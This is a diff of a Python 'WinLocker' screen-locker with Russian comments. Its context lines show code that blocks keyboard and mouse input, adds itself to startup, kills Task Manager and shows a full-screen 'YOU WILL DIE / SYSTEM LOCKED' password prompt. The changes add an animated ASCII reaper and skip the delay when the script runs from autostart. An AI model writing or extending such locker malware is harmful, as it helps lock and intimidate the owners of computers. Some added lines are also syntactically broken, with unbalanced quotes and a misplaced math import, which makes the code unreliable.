@@ -3,7 +3,6 @@ import ctypes, os, sys, time, threading, random, webbrowser, tkinter as tk
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
 TIMER_SECONDS = 15  # для теста, потом 600
-# Прямая ссылка на видео ВК
 VIDEO_URL = "https://vk.com/video-30602036_456293338"
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
@@ -78,10 +77,12 @@ class WinLocker:
         self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
         self.canvas.pack(fill='both', expand=True)
         
+        # Страшные надписи
         self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='white', font=('Courier', 60, 'bold'), tags="title")
         self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
         self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
         
+        # Поле ввода
         self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
         self.canvas.create_window(400, 360, window=self.entry)
         self.status = self.canvas.create_text(400, 420, text="", fill='white', font=('Courier', 20))
@@ -99,27 +100,30 @@ class WinLocker:
             self.canvas.itemconfig(self.status, text="НЕВЕРНЫЙ ПАРОЛЬ!")
             self.entry.delete(0, tk.END)
     
-    def animate(self):
-        self.canvas.delete("skull")
-        x_offset = random.randint(-5, 5)
-        y_offset = random.randint(-5, 5)
+    def draw_reaper(self, x, y, frame):
+        """Рисует ASCII Смерть с косой"""
         lines = [
-            "      .-\"-.\"",
-            "     /|6 6|\\",
-            "    {/(_0_)\\}",
-            "     _/ ^ \\_",
-            "    (/ /^\\ \\)-'",
-            "     \"\"' '\"\""
+            "     .-"-.",
+            "    /|6 6|\\",
+            "   {/(_0_)\\}",
+            "    _/ ^ \\_",
+            "   (/ /^\\ \\)-'",
+            "    \"\"' '\"\""
         ]
-        y = 480
-        for line in lines:
-            self.canvas.create_text(400 + x_offset, y + y_offset, text=line, fill='white', font=('Courier', 16), tags="skull")
-            y += 22
-        
-        for _ in range(20):
-            x, y = random.randint(0, 800), random.randint(0, 600)
-            s = random.randint(2, 4)
-            self.canvas.create_oval(x, y, x+s, y+s, fill='white', outline='white', tags="particle")
+        # Добавляем косу
+        angle = frame * 0.1
+        end_x = x + int(40 * math.cos(angle))
+        end_y = y + int(40 * math.sin(angle))
+        self.canvas.create_line(x, y, end_x, end_y, fill='white', width=2)
+        # Рисуем саму смерть
+        for i, line in enumerate(lines):
+            self.canvas.create_text(x, y + i * 20, text=line, fill='white', font=('Courier', 16), tags="reaper")
+    
+    def animate(self):
+        self.canvas.delete("reaper")
+        import math
+        # Рисуем Смерть с косой в центре
+        self.draw_reaper(400, 500, int(time.time() * 10))
         
         if random.random() < 0.1:
             self.canvas.itemconfig("title", fill='gray')
@@ -129,6 +133,10 @@ class WinLocker:
 
 # === ЗАПУСК ===
 if __name__ == "__main__":
+    # Если скрипт уже в автозагрузке, таймер не нужен
+    if os.path.basename(sys.argv[0]) != "winlocker.py":
+        TIMER_SECONDS = 0
+    
     add_to_startup()
     threading.Thread(target=kill_taskmgr, daemon=True).start()
     time.sleep(TIMER_SECONDS)
